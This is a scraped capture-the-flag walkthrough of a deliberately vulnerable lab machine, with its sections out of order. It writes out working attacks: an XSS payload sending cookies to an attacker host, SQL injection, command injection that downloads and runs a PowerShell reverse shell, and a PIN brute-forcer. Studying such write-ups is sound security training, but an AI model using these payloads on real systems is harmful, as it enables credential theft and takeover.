2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 PS C:\\xampp\\htdocs\\admin&gt; netstat -ano | findstr LISTEN TCP 0.0.0.0:80 0.0.0.0:0 LISTENING 2512 TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 756 TCP 0.0.0.0:443 0.0.0.0:0 LISTENING 2512 TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:910 0.0.0.0:0 LISTENING 1592 TCP 0.0.0.0:3306 0.0.0.0:0 LISTENING 2868 TCP 0.0.0.0:49664 0.0.0.0:0 LISTENING 468 TCP 0.0.0.0:49665 0.0.0.0:0 LISTENING 904 TCP 0.0.0.0:49666 0.0.0.0:0 LISTENING 884 TCP 0.0.0.0:49667 0.0.0.0:0 LISTENING 1456 TCP 0.0.0.0:49668 0.0.0.0:0 LISTENING 596 TCP 0.0.0.0:49669 0.0.0.0:0 LISTENING 604 TCP 10.10.10.154:139 0.0.0.0:0 LISTENING 4 TCP [::]:80 [::]:0 LISTENING 2512 TCP [::]:135 [::]:0 LISTENING 756 TCP [::]:443 [::]:0 LISTENING 2512 TCP [::]:445 [::]:0 LISTENING 4 TCP [::]:3306 [::]:0 LISTENING 2868 TCP [::]:49664 [::]:0 LISTENING 468 TCP [::]:49665 [::]:0 LISTENING 904 TCP [::]:49666 [::]:0 LISTENING 884 TCP [::]:49667 [::]:0 LISTENING 1456 TCP [::]:49668 [::]:0 LISTENING 596 TCP [::]:49669 [::]:0 LISTENING 604 To play with the service, we will forward the port to us with chisel. First, we set up chisel server on our kali box. 1 $ ./chisel server -p 8888 --reverse Next, we send the Windows version of chisel to the target and forward the port to 9100 on our kali box. 1 2 3 PS C:\\xampp\\htdocs\\admin&gt; iwr http://10.10.14.7:8000/chisel.exe -outfile \\windows\\temp\\chisel.exe PS C:\\xampp\\htdocs\\admin&gt; \\windows\\temp\\chisel.exe client 10.10.14.7:8888 R:9100:127.0.0.1:910 Now that the port is forwarded, we can connect to it with ncat to see what it does. The program asks for a PIN code. Trying a random number, we get no luck. 1 2 3 4 5 6 7 8 9 10 11 $ ncat -nv 127.0.0.1 9100 Ncat: Version 7.91 ( https://nmap.org/ncat ) Ncat: Connected to 127.0.0.1:9100. -------------------------------------------------------------- Internet E-Coin Transfer System International Bank of Sun church v0.1 by Gio &amp; Cneeliz -------------------------------------------------------------- Please enter your super secret 4 digit PIN code to login: [$] 1337 [!] Access denied, disconnecting client.... Since the PIN code is a 4-digit number, we can easily brute force it. To do this, we write a python script that supports multi-threading and uses pwntools to handle data. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 from pwn import * from concurrent.futures import ThreadPoolExecutor finished = False def try_pin(pin): global finished if not finished: r = remote(&quot;127.0.0.1&quot;, 9100, level=&quot;error&quot;) r.recvuntil(&quot;[$] &quot;) r.sendline(pin) response = r.recvline() r.close() if b&quot;denied&quot; not in response: log.success(f&quot;Success: {pin}&quot;) finished = True with ThreadPoolExecutor(max_workers=30) as executor: for i in range(9999): pin = str(i).zfill(4) executor.submit(try_pin, pin) After running the script, we get a valid PIN code. 1 2 $ python3 brute.py [+] Success: 0021 With the PIN code, we can let the program continue. It then asks for another input and execute some command. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ ncat -nv 127.0.0.1 9100 Ncat: Version 7.91 ( https://nmap.org/ncat ) Ncat: Connected to 127.0.0.1:9100. -------------------------------------------------------------- Internet E-Coin Transfer System International Bank of Sun church v0.1 by Gio &amp; Cneeliz -------------------------------------------------------------- Please enter your super secret 4 digit PIN code to login: [$] 0021 [$] PIN is correct, access granted! -------------------------------------------------------------- Please enter the amount of e-coins you would like to transfer: [$] 1 [$] Transfering $1 using our e-coin transfer application. [$] Executing e-coin transfer tool: C:\\Users\\admin\\Documents\\transfer.exe [$] Transaction in progress, you can safely disconnect... We try to fuzz it with a bunch of As, and we find that we have successfully overwritten the command executed. 1 [$] Executing e-coin transfer tool: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA To find out the position of the command in our payload, we generate a pattern string with msf-pattern_create. 1 2 $ msf-pattern_create -l 100 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A Using the pattern string instead of As, we get the following results. 1 [$] Executing e-coin transfer tool: 0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A Searching the above part in our pattern string, we find that it begins at the 32nd character. 1 2 $ msf-pattern_offset -l 100 -q 0Ab1 [*] Exact match at offset 32 Knowing the offset, we are now able to craft a payload to precisely overwrite the command. 1 2 $ python3 -c &quot;print(&#39;A&#39;*32 + &#39;powershell iex(new-object net.webclient).downloadstring(\\&#39;http://10.10.14.7:8000/rev.ps1\\&#39;)&#39;)&quot; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApowershell iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.7:8000/rev.ps1&#39;) We connect to the program again and paste our payload when asked for the input. It seems that the program is executing our command. 1 [$] Executing e-coin transfer tool: powershell iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.7:8000/rev.ps1&#39;) Checking our ncat listener, we get a reverse shell with system privileges. 1 2 3 4 5 6 $ rlwrap ncat -nlvp 4444 ... PS C:\\Windows\\system32&gt; whoami nt authority\\system","@type":"BlogPosting","headline":"HTB - Bankrobber","dateModified":"2021-04-04T18:12:38+10:00","datePublished":"2021-03-11T00:00:00+11:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://qtranspose.xyz/posts/htb-bankrobber/"},"author":{"@type":"Person","name":"QTranspose"},"url":"https://qtranspose.xyz/posts/htb-bankrobber/","@context":"https://schema.org"}</script><title>HTB - Bankrobber | QTranspose</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/qtranspose.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">QTranspose</a></div><div class="site-subtitle font-italic">Rock The Matrix</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/QTranspose" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://app.hackthebox.eu/profile/112476" aria-label="hackthebox" class="order-4" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HTB - Bankrobber</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HTB - Bankrobber</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Mar 11, 2021, 12:00 AM +1100" > Mar 11 <i class="unloaded">2021-03-11T00:00:00+11:00</i> </span> by <span class="author"> QTranspose </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Apr 4, 2021, 6:12 PM +1000" > Apr 4 <i class="unloaded">2021-04-04T18:12:38+10:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1716 words">9 min</span></div></div><div class="post-content"><p>Bankrobber is a vulnerable virtual machine created by Gioo and Cneeliz on HackTheBox. In this post, we document a complete walkthrough of pwning this machine.</p><h2 id="enumeration">Enumeration</h2><h3 id="nmap">Nmap</h3><p>Starting off with the <code class="language-plaintext highlighter-rouge">nmap</code> scan, we see that this is a Windows machine running HTTP, SMB and MariaDB services. Note that on both <code class="language-plaintext highlighter-rouge">80/http</code> and <code class="language-plaintext highlighter-rouge">443/https</code> it is <code class="language-plaintext highlighter-rouge">Apache</code> instead of <code class="language-plaintext highlighter-rouge">IIS</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre>$ nmap-default 10.10.10.154

Nmap scan report for 10.10.10.154
Host is up (0.093s latency).
Not shown: 996 filtered ports
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
|_http-title: E-coin
443/tcp  open  ssl/http     Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: Bad request!
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql        MariaDB (unauthorized)
Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1m34s, deviation: 0s, median: -1m35s
| smb-security-mode: 
|   account_used: &lt;blank&gt;
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-03-11T06:11:47
|_  start_date: 2021-03-11T06:06:21
</pre></table></code></div></div><p>For the details of the custom <code class="language-plaintext highlighter-rouge">nmap</code> commands, check <a href="/posts/workflow-improvement-with-simple-bash-scripts/">here</a>.</p><h3 id="http">HTTP</h3><p>Directing our browser to the address, we see a page like this. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/posts/htb-bankrobber/http1.jpg" alt="" /></p><p>On <code class="language-plaintext highlighter-rouge">443/https</code> we can see the same page, and the ssl certificate does not leak any subdomain information to us. After registering a user and logging in, we get the following page. We input some random values and click the button to see what it does. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/posts/htb-bankrobber/http2.jpg" alt="" /></p><p>The following message is displayed. Based on the message, we can assume that there is some kind of user simulation going on. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/posts/htb-bankrobber/http3.jpg" alt="" /></p><p>We use the following payload to see if there is an <code class="language-plaintext highlighter-rouge">XSS</code> vulnerability. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/posts/htb-bankrobber/http4.jpg" alt="" /></p><p>A few minutes later, we get a hit on our http server. It does appear vulnerable to <code class="language-plaintext highlighter-rouge">XSS</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>$ python -m http.server    
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.154 - - [11/Mar/2021 02:15:41] code 404, message File not found
10.10.10.154 - - [11/Mar/2021 02:15:41] "GET /lol.jpg HTTP/1.1" 404 -
</pre></table></code></div></div><h2 id="exploitation">Exploitation</h2><h3 id="xss">XSS</h3><p>Methodologies of exploiting <code class="language-plaintext highlighter-rouge">XSS</code> can be found <a href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting">here</a>. We will try to retrieve the admin cookies with the following payload.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>&lt;img src=x onerror=this.src="http://10.10.14.7:8000/?c="+document.cookie&gt;
</pre></table></code></div></div><p>Shortly after sending the payload, we get a hit on our http server.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>10.10.10.154 - - [11/Mar/2021 02:19:42] "GET /?c=username=YWRtaW4%3D;%20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D;%20id=1 HTTP/1.1" 200 -
</pre></table></code></div></div><p>By decoding the values, we get the creadentials <code class="language-plaintext highlighter-rouge">admin:Hopelessromantic</code>. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/posts/htb-bankrobber/username.jpg" alt="" /> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/posts/htb-bankrobber/password.jpg" alt="" /></p><h2 id="enumeration-1">Enumeration</h2><h3 id="admin-panel">Admin Panel</h3><p>After logging in with the credentials, we see an admin page. At the bottom of the page, there is a block that seems to execute commands. We try to execute <code class="language-plaintext highlighter-rouge">dir</code> as specified, but get the following error message. It seems that this function can only be used locally. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/posts/htb-bankrobber/admin1.jpg" alt="" /></p><p>Another interesting feature on this page is searching users. It seems retrieving data from the database service. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/posts/htb-bankrobber/admin2.jpg" alt="" /></p><p>We use a <code class="language-plaintext highlighter-rouge">quote</code> to see if it handles bad characters properly, and get an error as the following. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/posts/htb-bankrobber/sqli1.jpg" alt="" /></p><p>We then add <code class="language-plaintext highlighter-rouge">-- -</code> to comment out anything afterwards, and it works. There seems to be an <code class="language-plaintext highlighter-rouge">SQLi</code> vulnerability. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/posts/htb-bankrobber/sqli2.jpg" alt="" /></p><h2 id="exploitation-1">Exploitation</h2><h3 id="sql-injection">SQL Injection</h3><p>After playing with the <code class="language-plaintext highlighter-rouge">SQLi</code>, we find that it is <code class="language-plaintext highlighter-rouge">union</code> injectable, and there are 3 columns returned. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/posts/htb-bankrobber/sqli3.jpg" alt="" /></p><p>We can control the first two columns and see the values returned. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/posts/htb-bankrobber/sqli4.jpg" alt="" /></p><p>By using the following payload, we can read the source code of <code class="language-plaintext highlighter-rouge">backdoorchecker.php</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>term=1' union select 1,load_file('c:\\xampp\\htdocs\\admin\\backdoorchecker.php'),3-- -
</pre></table></code></div></div><p>The source code is shown below. Reading through it, we can see that the prohibited bad characters only include <code class="language-plaintext highlighter-rouge">$(</code> and <code class="language-plaintext highlighter-rouge">&amp;</code>, which makes it possible to inject command via <code class="language-plaintext highlighter-rouge">|</code>.</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="k">include</span><span class="p">(</span><span class="s1">'../link.php'</span><span class="p">);</span>
<span class="k">include</span><span class="p">(</span><span class="s1">'auth.php'</span><span class="p">);</span>

<span class="nv">$username</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nb">urldecode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]));</span>
<span class="nv">$password</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nb">urldecode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]));</span>
<span class="nv">$bad</span> 	  <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'$('</span><span class="p">,</span><span class="s1">'&amp;'</span><span class="p">);</span>
<span class="nv">$good</span> 	  <span class="o">=</span> <span class="s2">"ls"</span><span class="p">;</span>

<span class="k">if</span><span class="p">(</span><span class="nb">strtolower</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="kc">PHP_OS</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">))</span> <span class="o">==</span> <span class="s2">"win"</span><span class="p">){</span>
	<span class="nv">$good</span> <span class="o">=</span> <span class="s2">"dir"</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$username</span> <span class="o">==</span> <span class="s2">"admin"</span> <span class="o">&amp;&amp;</span> <span class="nv">$password</span> <span class="o">==</span> <span class="s2">"Hopelessromantic"</span><span class="p">){</span>
	<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])){</span>
			<span class="c1">// FILTER ESCAPE CHARS</span>
			<span class="k">foreach</span><span class="p">(</span><span class="nv">$bad</span> <span class="k">as</span> <span class="nv">$char</span><span class="p">){</span>
				<span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">],</span><span class="nv">$char</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">){</span>
					<span class="k">die</span><span class="p">(</span><span class="s2">"You're not allowed to do that."</span><span class="p">);</span>
				<span class="p">}</span>
			<span class="p">}</span>
			<span class="c1">// CHECK IF THE FIRST 2 CHARS ARE LS</span>
			<span class="k">if</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$good</span><span class="p">))</span> <span class="o">!=</span> <span class="nv">$good</span><span class="p">){</span>
				<span class="k">die</span><span class="p">(</span><span class="s2">"It's only allowed to use the </span><span class="nv">$good</span><span class="s2"> command"</span><span class="p">);</span>
			<span class="p">}</span>

			<span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"::1"</span><span class="p">){</span>
				<span class="nb">system</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span>
			<span class="p">}</span> <span class="k">else</span><span class="p">{</span>
				<span class="k">echo</span> <span class="s2">"It's only allowed to access this function from localhost (::1).&lt;br&gt; This is due to the recent hack attempts on our server."</span><span class="p">;</span>
			<span class="p">}</span>
	<span class="p">}</span>
<span class="p">}</span> <span class="k">else</span><span class="p">{</span>
	<span class="k">echo</span> <span class="s2">"You are not allowed to use this function!"</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>But before doing that, we have to find a way to achieve <code class="language-plaintext highlighter-rouge">SSRF</code>, since this function is only allowed locally.</p><h3 id="xss-to-ssrf">XSS to SSRF</h3><p>We can trick the server to send a request to itself to execute commands via the command injection we have identified previously in the source code. To achieve this, we first create a javascript file named <code class="language-plaintext highlighter-rouge">rev.js</code> in our http server directory.</p><div class="language-js highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">request</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
<span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://localhost/admin/backdoorchecker.php</span><span class="dl">"</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">cmd=dir | powershell iex(new-object net.webclient).downloadstring('http://10.10.14.7:8000/rev.ps1')</span><span class="dl">"</span><span class="p">;</span>
<span class="nx">request</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="nx">url</span><span class="p">);</span>
<span class="nx">request</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-Type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
<span class="nx">request</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>
</pre></table></code></div></div><p>We also put our reverse shell script <code class="language-plaintext highlighter-rouge">rev.ps1</code> from <code class="language-plaintext highlighter-rouge">nishang</code> to the same directory. Next, we use the following <code class="language-plaintext highlighter-rouge">XSS</code> payload to make the server execute our <code class="language-plaintext highlighter-rouge">rev.js</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>&lt;script src="http://10.10.14.7:8000/rev.js"&gt;&lt;/script&gt;
